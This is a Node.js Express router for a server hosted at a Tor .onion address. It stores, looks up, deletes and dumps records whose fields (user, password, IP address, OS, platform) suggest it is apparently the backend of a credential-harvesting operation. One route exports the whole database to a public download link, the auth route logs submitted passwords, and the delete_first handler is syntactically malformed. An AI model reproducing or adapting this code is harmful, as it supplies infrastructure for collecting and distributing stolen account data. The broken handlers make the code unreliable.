'use strict'

const express = require('express');
const db = require('./databaseModel');
const bodyParser = require('body-parser');

//const { Parser } = require('json2csv');
//const fields = ['user', 'password', 'IP address', 'O.S.', 'platform'];
//const j2c = new Parser({ fields });

const fs = require('file-system');
const server = express.Router();

const middleware = require('./authenticated');
const jwt = require('./jwt');

const domain = 'http://axji5glsgh3qcy7v2rfud3j7fwb3h2vyewq62b4sq63ftwu4d4yg4sid.onion:8080/webserver/';

function makeid(length) {
   var result           = '';
   var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
   var charactersLength = characters.length;
   for ( var i = 0; i < length; i++ ) {
      result += characters.charAt(Math.floor(Math.random() * charactersLength));
   }
   return result;
}


server.post('/auth', function(req, res) {
	const pass = req.body.pass;
	console.log(pass);
	if ( pass === jwt.getGrantedPermissionPassword() ) {
		res.status(200).send({"message": "successful auth", "token": jwt.createToken() });
	}
	else res.status(400).send({"message":"error auth"});
});

server.post('/insert', middleware.ensureAuth, function(req, res){
	console.log(req.body.user);
	db.insert(req, function(error, result) {
		if (error) res.status(error).send(result);
		else res.status(200).send(result);
	}); 
});

server.post('/find_name', middleware.ensureAuth, function(req, res){
	console.log("body",req.body);
	console.log(req.body["user"]);
	db.find_name(req.body.user, function(error, result) {
		if (error) res.status(error).send(result);
		else res.status(200).send(result);
	}); 	
});

server.post('/show_db', middleware.ensureAuth, function(req, res){
	db.show_db(function(error, result) {
		if (error) res.status(error).send(result);
		else {
			const random =  makeid(15);
			const filename = 'showDB' + random + Date.now() + '.json';
			fs.writeFile('./tomcat/'+filename, JSON.stringify(result), function(err) {
				if (err) {
					 console.log(err);
                                         res.status(500).send("error saving file");
				}
				res.status(200).send({"link": domain+filename});
			});
		}
	});
});

server.post('/delete_by_name', middleware.ensureAuth, function(req, res){
	console.log(req.body.user);
	db.delete_by_name(req.body.user, function(error, result) {
		if (error) res.status(error).send(result);
		else res.status(200).send(result);
	}); 
});

server.post('/delete_first', middleware.ensureAuth, function(req, res){
	console.log(req.body.user);
	if (db.delete_first(req.body.user), function(error, result) {
		if (error) res.status(error).send(result);
		else res.status(200).send(result);
	}); 
});
/*
server.post('/drop_db', function(req, res){
	if (db.drop_db(), function(error, result) {
		if (error) res.status(error).send(result);
		else res.status(200).send(req.body.pass);
	}); 
});
*/
module.exports = server;
